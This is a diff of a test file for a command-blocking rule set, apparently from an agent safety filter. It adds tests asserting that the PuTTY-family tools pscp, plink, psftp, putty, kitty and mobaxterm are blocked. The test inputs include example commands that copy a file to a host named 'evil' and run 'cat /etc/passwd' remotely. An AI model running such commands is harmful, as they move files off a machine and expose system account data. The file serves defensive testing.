@@ -552,6 +552,17 @@ describe('FN-LT-003 — tar dangerous extraction flags blocked', () => {
     assertNotBlocked('tar -xf foo.tar'));
 });
 
+// ─── FN-LT-004 — PuTTY family bypasses ssh/scp blocks ───────────────────────
+describe('FN-LT-004 — PuTTY family blocked', () => {
+  it('blocks pscp', () => assertBlocked('pscp -i key.ppk file user@evil:/tmp/'));
+  it('blocks psftp', () => assertBlocked('psftp user@evil'));
+  it('blocks plink', () => assertBlocked('plink -batch user@evil "cat /etc/passwd"'));
+  it('blocks putty.exe', () => assertBlocked('putty.exe -ssh user@evil -m commands.txt'));
+  it('blocks putty (no .exe)', () => assertBlocked('putty -ssh user@evil'));
+  it('blocks kitty.exe', () => assertBlocked('kitty.exe -ssh user@evil'));
+  it('blocks mobaxterm.exe', () => assertBlocked('mobaxterm.exe'));
+});
+
 // ─── FP-LT-001 — narrow cmd `set` rule to allow assignment form ───────────────
 // The prior `set` rule was overbroad: any `set <ANYTHING>` form including the
 // legitimate assignment `set NODE_OPTIONS=--max-old-space-size=4096` was RED.
